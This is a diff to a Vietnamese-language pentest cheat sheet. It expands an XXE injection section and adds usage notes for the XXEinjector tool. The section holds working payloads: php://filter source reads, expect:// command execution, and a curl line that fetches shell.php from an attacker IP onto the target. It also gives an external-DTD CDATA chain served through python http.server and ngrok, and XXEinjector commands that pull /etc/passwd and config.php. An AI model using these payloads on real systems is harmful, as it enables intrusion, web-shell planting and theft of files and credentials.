@@ -4,6 +4,19 @@ Một bảng tra cứu nhanh (Cheat Sheet) các lệnh hữu ích phục vụ ch
 
 ---
 
+## 📋 Mục lục
+1. [Trinh Sát & Kiểm Tra Hệ Thống (Reconnaissance)](#1-trinh-sát--kiểm-tra-hệ-thống-reconnaissance)
+2. [Kết Nối Từ Xa & Chuyển Tiếp Cổng (Port Forwarding)](#2-kết-nối-từ-xa--chuyển-tiếp-cổng-port-forwarding)
+3. [Xử Lý Wordlist & Biến Đổi Chuỗi (Data Manipulation)](#3-xử-lý-wordlist--biến-đổi-chuỗi-data-manipulation)
+4. [Tấn Công Dò Thám (Brute Force)](#4-tấn-công-dò-thám-brute-force)
+5. [Khai Thác Lỗ Hổng XXE Injection](#5-khai-thác-lỗ-hổng-xxe-injection)
+   * [Payloads Cơ Bản & Nâng Cao](#payloads-cơ-bản--nâng-cao)
+   * [Khai thác Nâng cao bằng CDATA và External DTD](#khai-thác-nâng-cao-bằng-cdata-và-external-dtd)
+   * [Tự động hóa với XXEinjector](#tự-động-hóa-với-xxeinjector)
+6. [Tài Nguyên & Danh Sách Hữu Ích (Wordlists & Datasets)](#6-tài-nguyên--danh-sách-hữu-ích-wordlists--datasets)
+
+---
+
 ## 1. Trinh Sát & Kiểm Tra Hệ Thống (Reconnaissance)
 
 ### Kiểm tra các file có quyền SUID (Set Owner User ID)
@@ -79,22 +92,24 @@ ffuf -w <FILE_NAME> -u <TARGET_HOST> -X POST \
 
 ## 5. Khai Thác Lỗ Hổng XXE Injection
 
-### Mã hóa nội dung bằng PHP Filter để đọc file mã nguồn (Tránh lỗi định dạng)
+### Payloads Cơ Bản & Nâng Cao
+
+#### Mã hóa nội dung bằng PHP Filter để đọc file mã nguồn (Tránh lỗi định dạng)
 ```xml
 <!ENTITY company SYSTEM "php://filter/read=convert.base64-encode/resource=abc.php">
 ```
 
-### Thực thi lệnh hệ thống qua XXE (Yêu cầu target cài module `expect`)
+#### Thực thi lệnh hệ thống qua XXE (Yêu cầu target cài module `expect`)
 ```xml
 <!ENTITY company SYSTEM "expect://id">
 ```
 
-### Tải Web Shell về server mục tiêu thông qua XXE (Sử dụng `$IFS` thay khoảng trắng)
+#### Tải Web Shell về server mục tiêu thông qua XXE (Sử dụng `$IFS` thay khoảng trắng)
 ```xml
-<!ENTITY company SYSTEM "expect://curlIFS-OIFS'OUR_IP/shell.php'">
+<!ENTITY company SYSTEM "expect://curl\({IFS}-O\){IFS}'OUR_IP/shell.php'">
 ```
 
-### Đọc file chứa ký tự đặc biệt bằng cách bọc trong thẻ CDATA
+#### Đọc file chứa ký tự đặc biệt bằng cách bọc trong thẻ CDATA (Mẫu cấu hình)
 ```xml
 <!DOCTYPE email [
   <!ENTITY % begin "<![CDATA[">
@@ -104,43 +119,26 @@ ffuf -w <FILE_NAME> -u <TARGET_HOST> -X POST \
 ]>
 ```
 
-# Khai thác Nâng cao Lỗ hổng XXE bằng CDATA và External DTD
-
-Hướng dẫn từng bước sử dụng kỹ thuật cấu hình tệp DTD bên ngoài kết hợp với thẻ `CDATA` để đọc mã nguồn hoặc dữ liệu nhị phân từ máy chủ mục tiêu thông qua lỗ hổng XML External Entity (XXE).
-
 ---
 
-## 📌 Tổng quan Kịch bản
-Khi máy chủ mục tiêu chạy các ứng dụng không phải PHP (hoặc không thể dùng bộ lọc `php://filter` để encode base64), việc đọc trực tiếp các tệp có chứa ký tự đặc biệt như `<`, `>`, `&` sẽ làm hỏng cấu trúc XML và gây lỗi hệ thống.
+### Khai thác Nâng cao bằng CDATA và External DTD
 
-Để giải quyết, chúng ta cần bọc nội dung tệp vào giữa cặp thẻ `<![CDATA[` và `]]>`. Do XML cấm nối chuỗi trực tiếp thực thể nội bộ và bên ngoài tại DTD gốc, ta bắt buộc phải sử dụng **XML Parameter Entities (`%`)** được nạp từ một máy chủ từ xa của kẻ tấn công để lách qua cơ chế bảo mật này.
+Khi máy chủ mục tiêu chạy các ứng dụng không phải PHP (hoặc không thể dùng bộ lọc `php://filter`), việc đọc trực tiếp các tệp chứa ký tự đặc biệt như `<`, `>`, `&` sẽ làm hỏng cấu trúc XML. Chúng ta bắt buộc phải sử dụng **XML Parameter Entities (`%`)** nạp từ máy chủ từ xa của kẻ tấn công nhằm bọc dữ liệu vào thẻ `CDATA`.
 
----
+#### 🛠 Các bước thực hiện:
 
-## 🛠 Các bước thực hiện
-
-### Bước 1: Tạo tệp DTD cấu hình nối chuỗi trên máy của bạn
-Trên máy tấn công của bạn, khởi tạo một tệp cấu hình đặt tên là `xxe.dtd`. Tệp này chịu trách nhiệm nhận các thành phần thẻ CDATA, tệp mục tiêu và ghép chúng lại thành thực thể gọi là `joined`.
-
+**Bước 1: Tạo tệp DTD cấu hình nối chuỗi trên máy của bạn (`xxe.dtd`)**
 ```bash
 echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
 ```
 
-### Bước 2: Khởi tạo Web Server công khai để lưu trữ tệp DTD
-Khởi chạy một HTTP Server tại cổng mong muốn (ví dụ: `8000`) để máy chủ mục tiêu có thể truy cập và tải tệp `xxe.dtd` về.
-
+**Bước 2: Khởi tạo Web Server công khai để lưu trữ tệp DTD**
 ```bash
 python3 -m http.server 8000
 ```
+*(Nếu cần public ra Internet qua mạng NAT, sử dụng: `ngrok http 8000`)*
 
-> 💡 **Mẹo:** Nếu máy mục tiêu nằm ở mạng ngoài (Internet) và máy bạn đang ở mạng nội bộ (NAT), hãy sử dụng thêm công cụ như `ngrok` để public cổng `8000` này ra internet:
-> ```bash
-> ngrok http 8000
-> ```
-
-### Bước 3: Gửi payload XXE trong HTTP Request tới mục tiêu
-Chèn đoạn mã khai thác sau vào phần tiêu đề XML (`<!DOCTYPE ...>`) của gói tin HTTP Request gửi đến ứng dụng web mục tiêu. Hãy thay thế đường dẫn tệp cần đọc và địa chỉ IP hoặc URL ngrok công khai của bạn.
-
+**Bước 3: Gửi payload XXE trong HTTP Request tới mục tiêu**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
@@ -153,25 +151,67 @@ Chèn đoạn mã khai thác sau vào phần tiêu đề XML (`<!DOCTYPE ...>`) 
 <root>
   <name>test</name>
   <tel>123456</tel>
-  <!-- Gọi thực thể &joined; tại vị trí dữ liệu được phản hồi ra màn hình -->
   <email>&joined;</email> 
 </root>
 ```
 
+#### 🔄 Cơ chế hoạt động:
+1. Máy chủ mục tiêu ghi nhận đầu thẻ vào `%begin;`, tệp cần đọc vào `%file;`, và đuôi thẻ vào `%end;`.
+2. Khi gặp lệnh gọi `%xxe;`, XML Parser tải file `xxe.dtd` từ máy tấn công về.
+3. Do dòng mã ghép chuỗi được nạp từ External DTD, XML Parser phá bỏ giới hạn bảo mật, cho phép ghép nối thành công thực thể thông thường `&joined;`.
+4. Thẻ `<email>&joined;</email>` xuất dữ liệu mã nguồn tệp mục tiêu ra màn hình an toàn mà không làm vỡ cấu trúc XML.
+
+> [!WARNING]
+> **Lưu ý kiểm thử:** Một số máy chủ chặn việc tự tham chiếu tệp (Entity reference loop) gây lỗi DOS. Cấu hình XML Parser của mục tiêu bắt buộc phải bật tính năng xử lý External Entity (`LIBXML_DTDLOAD` và `LIBXML_NOENT`).
+
 ---
 
-## 🔄 Cơ chế hoạt động của Payload
-1. **Định nghĩa thành phần:** Máy chủ mục tiêu ghi nhận đầu thẻ `<![CDATA[` vào `%begin;`, nội dung tệp cần đọc vào `%file;`, và đuôi thẻ `]]>` vào `%end;`.
-2. **Kích hoạt nạp tệp từ xa:** Khi gặp lệnh gọi `%xxe;` ở cuối khối DOCTYPE, trình phân tích XML Parser bắt buộc phải gửi một request HTTP đến server ngrok của bạn để tải file `xxe.dtd`.
-3. **Vượt rào bảo mật:** Do dòng mã ghép chuỗi được nạp từ một nguồn bên ngoài (External Source), XML Parser sẽ coi toàn bộ các thực thể thành phần bên trong nó đều là "external". Giới hạn bảo mật bị phá bỏ, hệ thống cho phép ghép nối `%begin;%file;%end;` và khởi tạo thành công thực thể thông thường mang tên `&joined;`.
-4. **Hiển thị kết quả:** Thẻ `<email>&joined;</email>` xuất dữ liệu mã nguồn của tệp mục tiêu ra màn hình dưới dạng văn bản thô nằm an toàn trong CDATA mà không làm vỡ cấu trúc XML ban đầu.
+### Tự động hóa với XXEinjector
 
----
+[XXEinjector](https://github.com) là công cụ chuyên tự động hóa quá trình khai thác lỗ hổng **Blind XXE** thông qua các giao thức Out-of-Band (OOB) như HTTP, FTP, Gopher.
 
-## ⚠️ Lưu ý quan trọng khi kiểm thử (Pentest)
-* **Vòng lặp DOS:** Một số máy chủ web hiện đại cấu hình chặn việc tự tham chiếu tệp (Entity reference loop). Kỹ thuật này có thể không đọc được một số tệp hệ thống cốt lõi hoặc file cấu hình lớn nếu chúng gây ra vòng lặp.
-* **Môi trường ứng dụng:** Để cuộc tấn công thành công, cấu hình XML Parser của ứng dụng mục tiêu bắt buộc phải bật tính năng xử lý External Entity (ví dụ trong PHP là `LIBXML_DTDLOAD` và `LIBXML_NOENT`).
+#### 🛠 Chuẩn bị file Request mẫu (`request.txt`)
+Bắt gói tin HTTP chứa dữ liệu XML bằng Burp Suite, lưu vào một file text và chèn từ khóa `XXEINJECT` tại vùng nhận dữ liệu:
+```http
+POST /process_xml.php HTTP/1.1
+Host: target.com
+Content-Type: application/xml
 
+<?xml version="1.0" encoding="UTF-8"?>
+<search>
+    <keyword>XXEINJECT</keyword>
+</search>
+```
+
+#### 🚀 Các lệnh khai thác phổ biến:
+
+* **Đọc file hệ thống cơ bản (Linux):**
+  ```bash
+  ruby XXEinjector.rb --host=[IP_CỦA_BẠN] --file=request.txt --path=/etc/passwd --oob=http
+  ```
+* **Đọc file mã nguồn PHP (Tự động hóa Base64 Filter):**
+  ```bash
+  ruby XXEinjector.rb --host=[IP_CỦA_BẠN] --file=request.txt --path=/var/www/html/config.php --oob=http --phpfilter
+  ```
+* **Liệt kê thư mục (Chỉ áp dụng với Java):**
+  ```bash
+  ruby XXEinjector.rb --host=[IP_CỦA_BẠN] --file=request.txt --path=/etc --oob=http
+  ```
+* **Khai thác qua HTTPS (SSL):**
+  ```bash
+  ruby XXEinjector.rb --host=[IP_CỦA_BẠN] --file=request.txt --path=/etc/passwd --oob=http --ssl
+  ```
+
+#### 📊 Bảng tra cứu Flags quan trọng:
+
+| Tham số | Ý nghĩa |
+| :--- | :--- |
+| `--host` | Địa chỉ IP máy tấn công của bạn để mở cổng hứng dữ liệu trả về. |
+| `--file` | Đường dẫn tới tệp tin chứa request HTTP mẫu (`request.txt`). |
+| `--path` | Đường dẫn của tệp tin hoặc thư mục cần trích xuất trên mục tiêu. |
+| `--oob` | Giao thức Out-of-Band sử dụng (`http`, `ftp`, `gopher`). |
+| `--phpfilter` | Bật bộ lọc mã hóa Base64 của PHP để tránh lỗi ký tự đặc biệt. |
+| `--ssl` | Bật chế độ hỗ trợ SSL/HTTPS cho gói tin gửi đi. |
 
 ---
 
@@ -181,5 +221,3 @@ Chèn đoạn mã khai thác sau vào phần tiêu đề XML (`<!DOCTYPE ...>`) 
 * **Danh sách thông tin đăng nhập mặc định:** [SecLists Default Credentials](https://github.com)
 * **Tài khoản mặc định của hệ thống điều khiển công nghiệp (ICS/SCADA):** [SCADAPASS](https://github.com)
 * **Dữ liệu tên các thành phố trên thế giới:** [World Cities Dataset](https://github.com)
-
-Tool xxe : XXEinjector
